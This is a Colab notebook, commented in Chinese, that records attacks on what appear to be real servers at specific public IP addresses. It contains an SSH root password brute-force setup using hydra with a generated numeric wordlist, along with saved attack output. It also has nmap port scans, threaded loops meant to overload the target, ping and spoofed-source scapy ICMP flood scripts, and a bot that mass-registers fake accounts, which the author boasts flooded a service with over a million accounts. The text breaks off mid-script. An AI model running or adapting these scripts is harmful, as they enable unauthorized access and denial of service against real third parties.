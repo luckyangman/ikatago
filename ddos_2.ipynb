{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "ddos 2 ",
      "provenance": [],
      "collapsed_sections": [],
      "include_colab_link": true
    },
    "kernelspec": {
      "display_name": "Python 3",
      "name": "python3"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/tonyjxc/ikatago/blob/master/ddos_2.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "Yh3FUJveE-Ad",
        "colab_type": "text"
      },
      "source": [
        "# 获取root权限\n",
        "## 1.hydra获取某种服务的权限\n",
        "## 2.nmap扫描目标机器的所有的开放端口"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "E-syR5FVbGe3",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "# linux 命令 安装hydra 和 nmap\n",
        "! apt-get update\n",
        "! apt-get install hydra\n",
        "! apt-get install nmap "
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "M3uLsahzcJv4",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "# 这个计算机服务器是没有字典的，利用python生成字典（虽然没什么用，这个生成的都是数字字典 repeat指字典的长度 6 的话就是000000-999999）\n",
        "import itertools as its\n",
        "words = \"1234568790\"\n",
        "r =its.product(words,repeat=6)\n",
        "dic = open(\"pass.txt\",\"a\")\n",
        "for i in r:\n",
        " dic.write(\"\".join(i))\n",
        " dic.write(\"\".join(\"\\n\"))\n",
        "dic.close()"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "p0Ij53uIbUXW",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "# 另一个人的服务器\n",
        "!hydra -l root -P /content/pass.txt -s 35857 -t 64 -e ns 120.53.123.43 ssh -I"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "CI7nOkMUl8XK",
        "colab_type": "code",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 319
        },
        "outputId": "6a143466-4085-44ec-c9d6-3e2a85bfa833"
      },
      "source": [
        "# 白嫖者的服务器\n",
        "# laozhang\n",
        "!hydra -l root -P /content/pass.txt -s 22 -t 64 -e ns 47.92.159.180 ssh -I -R"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.\n",
            "\n",
            "Hydra (http://www.thc.org/thc-hydra) starting at 2020-08-15 08:56:43\n",
            "[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\n",
            "[DATA] max 64 tasks per 1 server, overall 64 tasks, 1000002 login tries (l:1/p:1000002), ~15626 tries per task\n",
            "[DATA] attacking ssh://47.92.159.180:22/\n",
            "[STATUS] 783.00 tries/min, 783 tries in 00:01h, 999301 to do in 21:17h, 64 active\n",
            "[STATUS] 715.00 tries/min, 2145 tries in 00:03h, 997986 to do in 23:16h, 64 active\n",
            "[STATUS] 725.14 tries/min, 5076 tries in 00:07h, 995055 to do in 22:53h, 64 active\n",
            "[STATUS] 706.53 tries/min, 10598 tries in 00:15h, 989533 to do in 23:21h, 64 active\n",
            "[STATUS] 693.03 tries/min, 21484 tries in 00:31h, 978647 to do in 23:33h, 64 active\n",
            "[STATUS] 689.13 tries/min, 32389 tries in 00:47h, 967742 to do in 23:25h, 64 active\n",
            "[STATUS] 686.10 tries/min, 43224 tries in 01:03h, 956907 to do in 23:15h, 64 active\n",
            "[STATUS] 685.67 tries/min, 54168 tries in 01:19h, 945963 to do in 22:60h, 64 active\n",
            "[STATUS] 687.07 tries/min, 65272 tries in 01:35h, 934859 to do in 22:41h, 64 active\n",
            "[STATUS] 688.45 tries/min, 76418 tries in 01:51h, 923713 to do in 22:22h, 64 active\n",
            "[STATUS] 689.76 tries/min, 87600 tries in 02:07h, 912531 to do in 22:03h, 64 active\n",
            "The session file ./hydra.restore was written. Type \"hydra -R\" to resume session.\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "9EhJ42hqcdfI",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "# 这个的目的就不是为了黑了\n",
        "# 利用多线程开辟出一堆破解的命令\n",
        "# 类似于ping 主要目的就是为了让服务器跑不动\n",
        "# job是命令\n",
        "import threading\n",
        "import time\n",
        "import os\n",
        "import requests\n",
        "# 在本机linux终端输入命令\n",
        "def job1():\n",
        "    while 1:\n",
        "        os.system(\"hydra -l root -P /content/pass.txt -s 32182 -t 64 -e ns 120.53.123.43 ssh\")\n",
        "\n",
        "# 主函数，开辟多线程（300）（可以直接while True:  但是这样本机有可能会卡机），同时运行job1\n",
        "def main():\n",
        "    i=1\n",
        "    while(i<=300):\n",
        "        addthread=threading.Thread(target=job1)\n",
        "        addthread.start()\n",
        "        i=i+1;\n",
        "    while(1):\n",
        "      i=i+1\n",
        "\n",
        "main()\n"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "3mY1oafH5mf-",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "# 防止被屏蔽\n",
        "# nmap有很多种形式，这个是对服务器如果禁止ping 上面的命令就失效了\n",
        "# 下面的命令任然可以获取端口号 但是速度会慢很多\n",
        "!nmap -sS -p 1-65535 -Pn -v 47.92.159.180\n"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "iram9-PtmVrc",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "#速度快但是可能会被屏蔽\n",
        "!hydra -l root -P /content/pass.txt -s 22 -t 64 -e ns 47.92.159.180 ssh -I -R"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "xH2CF4iLE6u7",
        "colab_type": "text"
      },
      "source": [
        "# ping ddos"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "5SISAzZ_pLkQ",
        "colab_type": "code",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 454
        },
        "outputId": "d18b18c4-fc64-4be0-c186-d2507d547582"
      },
      "source": [
        "# 旧的ddos 单纯的ping\n",
        "# linux机器上先安装ping\n",
        "! apt-get install inetutils-ping"
      ],
      "execution_count": 2,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "Reading package lists... Done\n",
            "Building dependency tree       \n",
            "Reading state information... Done\n",
            "The following package was automatically installed and is no longer required:\n",
            "  libnvidia-common-440\n",
            "Use 'apt autoremove' to remove it.\n",
            "The following additional packages will be installed:\n",
            "  netbase\n",
            "The following NEW packages will be installed:\n",
            "  inetutils-ping netbase\n",
            "0 upgraded, 2 newly installed, 0 to remove and 35 not upgraded.\n",
            "Need to get 72.8 kB of archives.\n",
            "After this operation, 389 kB of additional disk space will be used.\n",
            "Get:1 http://archive.ubuntu.com/ubuntu bionic/main amd64 netbase all 5.4 [12.7 kB]\n",
            "Get:2 http://archive.ubuntu.com/ubuntu bionic/universe amd64 inetutils-ping amd64 2:1.9.4-3 [60.0 kB]\n",
            "Fetched 72.8 kB in 1s (57.6 kB/s)\n",
            "Selecting previously unselected package netbase.\n",
            "(Reading database ... 144487 files and directories currently installed.)\n",
            "Preparing to unpack .../archives/netbase_5.4_all.deb ...\n",
            "Unpacking netbase (5.4) ...\n",
            "Selecting previously unselected package inetutils-ping.\n",
            "Preparing to unpack .../inetutils-ping_2%3a1.9.4-3_amd64.deb ...\n",
            "Unpacking inetutils-ping (2:1.9.4-3) ...\n",
            "Setting up netbase (5.4) ...\n",
            "Setting up inetutils-ping (2:1.9.4-3) ...\n",
            "Processing triggers for man-db (2.8.3-2ubuntu0.1) ...\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "NnK7tIk9xDBC",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "# 最原始的ping起不到攻击作用 但是-s可以显示最大的ping的包的大小\n",
        "# linux ping包最大支持60000左右的bytes \n",
        "# 但是这样可能对方服务器会禁止掉\n",
        "# 所以自己试试取个适当的数字试出来一个比较大的，后面就可以开始使用\n",
        "! ping 47.92.159.180 -s 6000"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "p4-fBygPxBA9",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "# 本机有root权限可以使用-i -i是指发送间隔\n",
        "# 你可以设置的很小0.00001这样发送的包很快，你一秒内发出包的流量，就是对方1s所要接受的流量\n",
        "# 对方流量承受过大，就会宕机\n",
        "# 自己的机器可能力道不够大\n",
        "# 所以如果得到别人机器的控制权 一起发送包 流量就很大了\n",
        "! ping 47.92.159.180 -i 0.001 -s 1200"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "VPfcNXa1udZs",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "# 同上多线程 原始写的\n",
        "import time\n",
        "import os\n",
        "\n",
        "def job1():\n",
        "    os.popen(\"ping www.qqbw.com -i 0.000001 -s 996\")\n",
        "def job2():\n",
        "    print(2)\n",
        "\n",
        "def main():\n",
        "  while 1:\n",
        "    added_thread=threading.Thread(target=job1,name='t1')\n",
        "    added_thread.start()\n",
        "  print(\"alldone\")\n",
        "\n",
        "main()"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "L4aTclKrztBi",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        ""
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "ARCDXoN7ztD4",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        ""
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "pqSGXQajztGp",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        ""
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "RnzRBImgztKK",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        ""
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "D5Ctr7aU0CgA",
        "colab_type": "text"
      },
      "source": [
        "# scapy ping\n",
        "### youtube上看到的专门讲攻击的\n",
        "### 网址：https://www.youtube.com/watch?v=F65b_JVUyLg&list=PL17RctH5HKX5KYDb_wdMDC-2g4inEODD9\n",
        "##### 太专业了不会，不懂就别问我了（这个是从网络基础开始的）"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "WfuCqkkGztO4",
        "colab_type": "code",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 205
        },
        "outputId": "97494d7b-19f9-450a-e0a6-b9df5be7471c"
      },
      "source": [
        "# python要的scapy包 好像是黑客用的\n",
        "! pip install scapy"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "Collecting scapy\n",
            "\u001b[?25l  Downloading https://files.pythonhosted.org/packages/52/e7/464079606a9cf97ad04936c52a5324d14dae36215f9319bf3faa46a7907d/scapy-2.4.3.tar.gz (905kB)\n",
            "\r\u001b[K     |▍                               | 10kB 14.4MB/s eta 0:00:01\r\u001b[K     |▊                               | 20kB 2.9MB/s eta 0:00:01\r\u001b[K     |█                               | 30kB 3.7MB/s eta 0:00:01\r\u001b[K     |█▌                              | 40kB 4.1MB/s eta 0:00:01\r\u001b[K     |█▉                              | 51kB 3.2MB/s eta 0:00:01\r\u001b[K     |██▏                             | 61kB 3.7MB/s eta 0:00:01\r\u001b[K     |██▌                             | 71kB 3.8MB/s eta 0:00:01\r\u001b[K     |███                             | 81kB 4.2MB/s eta 0:00:01\r\u001b[K     |███▎                            | 92kB 4.5MB/s eta 0:00:01\r\u001b[K     |███▋                            | 102kB 4.3MB/s eta 0:00:01\r\u001b[K     |████                            | 112kB 4.3MB/s eta 0:00:01\r\u001b[K     |████▍                           | 122kB 4.3MB/s eta 0:00:01\r\u001b[K     |████▊                           | 133kB 4.3MB/s eta 0:00:01\r\u001b[K     |█████                           | 143kB 4.3MB/s eta 0:00:01\r\u001b[K     |█████▍                          | 153kB 4.3MB/s eta 0:00:01\r\u001b[K     |█████▉                          | 163kB 4.3MB/s eta 0:00:01\r\u001b[K     |██████▏                         | 174kB 4.3MB/s eta 0:00:01\r\u001b[K     |██████▌                         | 184kB 4.3MB/s eta 0:00:01\r\u001b[K     |██████▉                         | 194kB 4.3MB/s eta 0:00:01\r\u001b[K     |███████▎                        | 204kB 4.3MB/s eta 0:00:01\r\u001b[K     |███████▋                        | 215kB 4.3MB/s eta 0:00:01\r\u001b[K     |████████                        | 225kB 4.3MB/s eta 0:00:01\r\u001b[K     |████████▎                       | 235kB 4.3MB/s eta 0:00:01\r\u001b[K     |████████▊                       | 245kB 4.3MB/s eta 0:00:01\r\u001b[K     |█████████                       | 256kB 4.3MB/s eta 0:00:01\r\u001b[K     |█████████▍                      | 266kB 4.3MB/s eta 0:00:01\r\u001b[K     |█████████▊                      | 276kB 4.3MB/s eta 0:00:01\r\u001b[K     |██████████▏                     | 286kB 4.3MB/s eta 0:00:01\r\u001b[K     |██████████▌                     | 296kB 4.3MB/s eta 0:00:01\r\u001b[K     |██████████▉                     | 307kB 4.3MB/s eta 0:00:01\r\u001b[K     |███████████▏                    | 317kB 4.3MB/s eta 0:00:01\r\u001b[K     |███████████▋                    | 327kB 4.3MB/s eta 0:00:01\r\u001b[K     |████████████                    | 337kB 4.3MB/s eta 0:00:01\r\u001b[K     |████████████▎                   | 348kB 4.3MB/s eta 0:00:01\r\u001b[K     |████████████▊                   | 358kB 4.3MB/s eta 0:00:01\r\u001b[K     |█████████████                   | 368kB 4.3MB/s eta 0:00:01\r\u001b[K     |█████████████▍                  | 378kB 4.3MB/s eta 0:00:01\r\u001b[K     |█████████████▊                  | 389kB 4.3MB/s eta 0:00:01\r\u001b[K     |██████████████▏                 | 399kB 4.3MB/s eta 0:00:01\r\u001b[K     |██████████████▌                 | 409kB 4.3MB/s eta 0:00:01\r\u001b[K     |██████████████▉                 | 419kB 4.3MB/s eta 0:00:01\r\u001b[K     |███████████████▏                | 430kB 4.3MB/s eta 0:00:01\r\u001b[K     |███████████████▋                | 440kB 4.3MB/s eta 0:00:01\r\u001b[K     |████████████████                | 450kB 4.3MB/s eta 0:00:01\r\u001b[K     |████████████████▎               | 460kB 4.3MB/s eta 0:00:01\r\u001b[K     |████████████████▋               | 471kB 4.3MB/s eta 0:00:01\r\u001b[K     |█████████████████               | 481kB 4.3MB/s eta 0:00:01\r\u001b[K     |█████████████████▍              | 491kB 4.3MB/s eta 0:00:01\r\u001b[K     |█████████████████▊              | 501kB 4.3MB/s eta 0:00:01\r\u001b[K     |██████████████████              | 512kB 4.3MB/s eta 0:00:01\r\u001b[K     |██████████████████▌             | 522kB 4.3MB/s eta 0:00:01\r\u001b[K     |██████████████████▉             | 532kB 4.3MB/s eta 0:00:01\r\u001b[K     |███████████████████▏            | 542kB 4.3MB/s eta 0:00:01\r\u001b[K     |███████████████████▌            | 552kB 4.3MB/s eta 0:00:01\r\u001b[K     |████████████████████            | 563kB 4.3MB/s eta 0:00:01\r\u001b[K     |████████████████████▎           | 573kB 4.3MB/s eta 0:00:01\r\u001b[K     |████████████████████▋           | 583kB 4.3MB/s eta 0:00:01\r\u001b[K     |█████████████████████           | 593kB 4.3MB/s eta 0:00:01\r\u001b[K     |█████████████████████▍          | 604kB 4.3MB/s eta 0:00:01\r\u001b[K     |█████████████████████▊          | 614kB 4.3MB/s eta 0:00:01\r\u001b[K     |██████████████████████          | 624kB 4.3MB/s eta 0:00:01\r\u001b[K     |██████████████████████▍         | 634kB 4.3MB/s eta 0:00:01\r\u001b[K     |██████████████████████▉         | 645kB 4.3MB/s eta 0:00:01\r\u001b[K     |███████████████████████▏        | 655kB 4.3MB/s eta 0:00:01\r\u001b[K     |███████████████████████▌        | 665kB 4.3MB/s eta 0:00:01\r\u001b[K     |███████████████████████▉        | 675kB 4.3MB/s eta 0:00:01\r\u001b[K     |████████████████████████▎       | 686kB 4.3MB/s eta 0:00:01\r\u001b[K     |████████████████████████▋       | 696kB 4.3MB/s eta 0:00:01\r\u001b[K     |█████████████████████████       | 706kB 4.3MB/s eta 0:00:01\r\u001b[K     |█████████████████████████▍      | 716kB 4.3MB/s eta 0:00:01\r\u001b[K     |█████████████████████████▊      | 727kB 4.3MB/s eta 0:00:01\r\u001b[K     |██████████████████████████      | 737kB 4.3MB/s eta 0:00:01\r\u001b[K     |██████████████████████████▍     | 747kB 4.3MB/s eta 0:00:01\r\u001b[K     |██████████████████████████▉     | 757kB 4.3MB/s eta 0:00:01\r\u001b[K     |███████████████████████████▏    | 768kB 4.3MB/s eta 0:00:01\r\u001b[K     |███████████████████████████▌    | 778kB 4.3MB/s eta 0:00:01\r\u001b[K     |███████████████████████████▉    | 788kB 4.3MB/s eta 0:00:01\r\u001b[K     |████████████████████████████▎   | 798kB 4.3MB/s eta 0:00:01\r\u001b[K     |████████████████████████████▋   | 808kB 4.3MB/s eta 0:00:01\r\u001b[K     |█████████████████████████████   | 819kB 4.3MB/s eta 0:00:01\r\u001b[K     |█████████████████████████████▎  | 829kB 4.3MB/s eta 0:00:01\r\u001b[K     |█████████████████████████████▊  | 839kB 4.3MB/s eta 0:00:01\r\u001b[K     |██████████████████████████████  | 849kB 4.3MB/s eta 0:00:01\r\u001b[K     |██████████████████████████████▍ | 860kB 4.3MB/s eta 0:00:01\r\u001b[K     |██████████████████████████████▊ | 870kB 4.3MB/s eta 0:00:01\r\u001b[K     |███████████████████████████████▏| 880kB 4.3MB/s eta 0:00:01\r\u001b[K     |███████████████████████████████▌| 890kB 4.3MB/s eta 0:00:01\r\u001b[K     |███████████████████████████████▉| 901kB 4.3MB/s eta 0:00:01\r\u001b[K     |████████████████████████████████| 911kB 4.3MB/s \n",
            "\u001b[?25hBuilding wheels for collected packages: scapy\n",
            "  Building wheel for scapy (setup.py) ... \u001b[?25l\u001b[?25hdone\n",
            "  Created wheel for scapy: filename=scapy-2.4.3-py2.py3-none-any.whl size=1043873 sha256=652e1c773181b457295061007e0d852580a1ae512c98da62dca7d40204ad3724\n",
            "  Stored in directory: /root/.cache/pip/wheels/95/bf/51/905b3e84ec4ca910ce4ae92173c7334623105a265bdd1d9438\n",
            "Successfully built scapy\n",
            "Installing collected packages: scapy\n",
            "Successfully installed scapy-2.4.3\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "f6Dk2lBRzvqm",
        "colab_type": "code",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 470
        },
        "outputId": "f3190374-59c1-43e9-fb3c-dd7fefa83566"
      },
      "source": [
        "# 自己创建出ping的数据包\n",
        "# 上面ping ***是默认自带的\n",
        "# 而这个是利用python自己创建出一个ping的包 包括内容什么的\n",
        "from scapy.all import *\n",
        "from random import randint\n",
        "\n",
        "def scapy_ping_one(host):\n",
        "    id_ip=randint(1,65535) #随机产生ip id位\n",
        "    id_ping = randint(1,65535) #随机产生ping id位\n",
        "    seq_ping = randint(1,65535) #随机产生ping序列号\n",
        "    #构造ping数据包\n",
        "    packet=IP(dst=host,ttl=64,id=id_ip)/ICMP(id=id_ping,seq=seq_ping)/b'hello world'*10000\n",
        "    ping = sr1(packet,timeout=2) #获取响应时间，超时2s,关闭详细信息\n",
        "    ping.show()\n",
        "     \n",
        "if __name__ == '__main__':\n",
        "    scapy_ping_one( '47.92.159.180')\n",
        " "
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "Begin emission:\n",
            "Finished sending 10000 packets.\n",
            "\n",
            "Received 759 packets, got 749 answers, remaining 9251 packets\n",
            "###[ IP ]### \n",
            "  version   = 4\n",
            "  ihl       = 5\n",
            "  tos       = 0x0\n",
            "  len       = 39\n",
            "  id        = 64126\n",
            "  flags     = \n",
            "  frag      = 0\n",
            "  ttl       = 42\n",
            "  proto     = icmp\n",
            "  chksum    = 0x1b29\n",
            "  src       = 47.92.159.180\n",
            "  dst       = 172.28.0.2\n",
            "  \\options   \\\n",
            "###[ ICMP ]### \n",
            "     type      = echo-reply\n",
            "     code      = 0\n",
            "     chksum    = 0x551e\n",
            "     id        = 0x1b61\n",
            "     seq       = 0xfdb1\n",
            "###[ Raw ]### \n",
            "        load      = 'hello world'\n",
            "\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "XxWl3qZw8K5M",
        "colab_type": "code",
        "colab": {}
      },
      "source": [
        "# 多线程发送ping包的ddos攻击\n",
        "# 好像有问题，不知道对方服务器有没有收到，自己的机器一段时间后就会卡死 可能有地方写错了 谨慎运行\n",
        "from scapy.all import *\n",
        "from random import randint\n",
        "import multiprocessing\n",
        "RANDOM_IP_POOL=['192.168.10.222/0'] \n",
        "# 产生类似 192.168.1.1 135.13.185.2各种随机的ip地址 下面有演示\n",
        "# 后面包内可以使用 这样的ping包完全都是伪造的对方也不知道你的地址\n",
        "def Random_IP():\n",
        "    str_ip = RANDOM_IP_POOL[random.randint(0,len(RANDOM_IP_POOL) - 1)]\n",
        "    str_ip_addr = str_ip.split('/')[0]\n",
        "    str_ip_mask = str_ip.split('/')[1]\n",
        "    ip_addr = struct.unpack('>I',socket.inet_aton(str_ip_addr))[0]\n",
        "    mask = 0x0\n",
        "    for i in range(31, 31 - int(str_ip_mask), -1):\n",
        "        mask = mask | ( 1 << i)\n",
        "    ip_addr_min = ip_addr & (mask & 0xffffffff)\n",
        "    ip_addr_max = ip_addr | (~mask & 0xffffffff)\n",
        "    return socket.inet_ntoa(struct.pack('>I', random.randint(ip_addr_min, ip_addr_max)))\n",
        "\n",
        "# 上面创建ping包的命令\n",
        "def scapy_ping_one(host):\n",
        "    id_ip=randint(1,65535) #随机产生ip id位\n",
        "    id_ping = randint(1,65535) #随机产生ping id位\n",
        "    seq_ping = randint(1,65535) #随机产生ping序列号\n",
        "    source_ip=Random_IP()\n",
        "    #构造ping数据包\n",
        "    packet=IP(src=source_ip,dst=host,ttl=64,id=id_ip)/ICMP(id=id_ping,seq=seq_ping)/b'hello world'*100\n",
        "    ping = send(packet) #获取响应时间，超时2s,关闭详细信息\n",
        "\n",
        "# ping包的命令重复1w次\n",
        "def scapy_ping_10k(host):\n",
        "  for i in range(10000+1):\n",
        "    scapy_ping_one(host)\n",
        "\n",
        "# multiprocessing多线程 （好像比我写的厉害很多 不知道有什么区别）\n",
        "def scapy_ping_dos(host,processes=50):\n",
        "  pool=multiprocessing.Pool(processes = processes)\n",
        "  while True:\n",
        "    try:\n",
        "      (pool.apply_async(scapy_ping_10k,(host)))\n",
        "    except KeyboardInterrupt:\n",
        "      pool.terminate()\n",
        "      \n",
        "if __name__ == '__main__':\n",
        "    scapy_ping_dos( '47.92.159.180')\n",
        " "
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "wd3edcAB9sy8",
        "colab_type": "code",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 35
        },
        "outputId": "d439e719-d2ee-4947-8a0d-dd3eac39f11f"
      },
      "source": [
        "#生成随机伪装IP 演示\n",
        "RANDOM_IP_POOL=['192.168.10.222/0']\n",
        "def random_ip():\n",
        "    str_ip = RANDOM_IP_POOL[random.randint(0,len(RANDOM_IP_POOL) - 1)]\n",
        "    str_ip_addr = str_ip.split('/')[0]\n",
        "    str_ip_mask = str_ip.split('/')[1]\n",
        "    ip_addr = struct.unpack('>I',socket.inet_aton(str_ip_addr))[0]\n",
        "    mask = 0x0\n",
        "    for i in range(31, 31 - int(str_ip_mask), -1):\n",
        "        mask = mask | ( 1 << i)\n",
        "    ip_addr_min = ip_addr & (mask & 0xffffffff)\n",
        "    ip_addr_max = ip_addr | (~mask & 0xffffffff)\n",
        "    return socket.inet_ntoa(struct.pack('>I', random.randint(ip_addr_min, ip_addr_max)))\n",
        "\n",
        "random_ip()"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "application/vnd.google.colaboratory.intrinsic+json": {
              "type": "string"
            },
            "text/plain": [
              "'179.69.138.140'"
            ]
          },
          "metadata": {
            "tags": []
          },
          "execution_count": 33
        }
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "QeQdaEV_IH-R",
        "colab_type": "text"
      },
      "source": [
        "# 注册服务器攻击\n",
        "# 这个我只是为了在网上运行，这样就不是我的机器去发包了，被发现了她也只会发现是被一个google云攻击的 嘻嘻\n"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "ALzJJYRYMTvM",
        "colab_type": "code",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 34
        },
        "outputId": "f609d393-05f5-4f77-a16a-66ed00b24e69"
      },
      "source": [
        "# 单线程的test1.0\n",
        "import requests\n",
        "import json\n",
        "import random\n",
        "import string\n",
        "import threading\n",
        "\n",
        "url='http://47.92.159.180:7070/user/register'\n",
        "headers={\n",
        "\"Accept\": \"*/*\",\n",
        "\"Accept-Encoding\": \"gzip;q=1.0, compress;q=0.5\",\n",
        "\"Accept-Language\": \"zh-Hans-CN;q=1.0, en-CN;q=0.9, zh-Hant-CN;q=0.8\",\n",
        "\"Connection\": \"close\",\n",
        "\"Content-Length\": \"51\",\n",
        "\"Content-Type\": \"application/json\",\n",
        "\"Host\": \"47.92.159.180:7070\",\n",
        "\"User-Agent\": \"Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Win64; x64; Trident/6.0)\"\n",
        ",\n",
        "}\n",
        "\n",
        "def zhuce():\n",
        "    # 注册账号随机用户名和密码的长度\n",
        "    #长度\n",
        "    a=random.randint(5,20)\n",
        "    b=random.randint(5,20)\n",
        "    # 注册账号的随机用户名和密码\n",
        "    #用户名\n",
        "    username=''.join(random.sample('abcdefghijklmnopqrstuvwxyz0123456789.+-*/-=0!@#$%$^&_()*{}|<>?{}|ABCDEFGHIJKLMNOPQRSTUVWXYZ',a))\n",
        "    #密码\n",
        "    passwd=''.join(random.sample('abcdefghijklmnopqrstuvwxyz0123456789.+-*/-=0!@#$%$^&_()*{}|<>?{}|ABCDEFGHIJKLMNOPQRSTUVWXYZ',b))\n",
        "\n",
        "    #POST的包\n",
        "    data={\"userName\":username,\"passWord\":passwd}\n",
        "    \n",
        "\n",
        "    # print(username)\n",
        "    # print(passwd)\n",
        "    print(requests.post(url,json=data,headers=headers).text)\n",
        "\n",
        "zhuce()\n",
        "\n",
        "# 现在可能不太行了 对方开了防御检测 一个ip一段时间内不让发太多\n",
        "# 而且好像检测出这是一个爬虫写的，因为我软件注册抓包试过 还是可以\n",
        "# 上面的细节后说 主要在自己电脑上"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "text": [
            "{\"Msg\":\"403\"}\n"
          ],
          "name": "stdout"
        }
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "hTxYYV_JH7nN",
        "colab_type": "code",
        "colab": {
          "base_uri": "https://localhost:8080/",
          "height": 34
        },
        "outputId": "3ebb77c2-56b7-44d9-b90c-fd2bc2ae5e77"
      },
      "source": [
        "# 多线程 当初就用的这个命令，给他注册了100w+个小号\n",
        "# mark一下 800+开始 尝试运行86667 运行一晚上后1028127 直接就塞了100w个啊啊啊啊 就很爽\n",
        "# 塞爆他的服务器\n",
        "# 现在好像不行了，会被检测出来 懒得改了，刷leetcode去了\n",
        "# 细节晚点说\n",
        "import requests\n",
        "import json\n",
        "import random\n",
        "import string\n",
        "import threading\n",
        "import multiprocessing\n",
        "url = 'http://47.92.159.180:7070/user/register'\n",
        "headers = {\n",
        "    \"Accept\": \"*/*\",\n",
        "    \"Accept-Encoding\": \"gzip;q=1.0, compress;q=0.5\",\n",
        "    \"Accept-Language\": \"zh-Hans-CN;q=1.0, en-CN;q=0.9, zh-Hant-CN;q=0.8\",\n",
        "    \"Connection\": \"close\",\n",
        "    \"Content-Length\": \"51\",\n",
        "    \"Content-Type\": \"application/json\",\n",
        "    \"Host\": \"47.92.159.180:7070\",\n",
        "    \"User-Agent\": \"katago/2.0 (io.katago; build:16; iOS 13.4.1) Alamofire/4.9.1\",\n",
        "}\n",
        "\n",
        "\n",
        "def zhuce():\n",
        "    # 长度\n",
        "    a = random.randint(5, 20)\n",
        "    b = random.randint(5, 20)\n",
        "    # 用户名\n",
        "    username = ''.join(random.sample('abcdefghijklmnopqrstuvwxyz0123456789.+-*/-=0!@#$%$^&_()*{}|<>?{}|ABCDEFGHIJKLMNOPQRSTUVWXYZ', a))\n",
        "    # 密码\n",
        "    passwd = ''.join(random.sample('abcdefghijklmnopqrstuvwxyz0123456789.+-*/-=0!@#$%$^&_()*{}|<>?{}|ABCDEFGHIJKLMNOPQRSTUVWXYZ', b))\n",
        "    # 爬虫\n",
        "    data = {\"userName\": username, \"passWord\": passwd}\n",
        "\n",
        "    # print(username)\n",
        "    # print(passwd)\n",
        "    # print(requests.post(url,json=data,headers=headers).text)\n",
        "    return requests.post(url, json=data, headers=headers).status_code\n",
        "\n",
        "\n",
        "def job1():\n",
        "    while True:\n",
        "        if zhuce() != 200:\n",
        "            print(\"Error\")\n",
        "\n",
        "\n",
        "def main():\n",
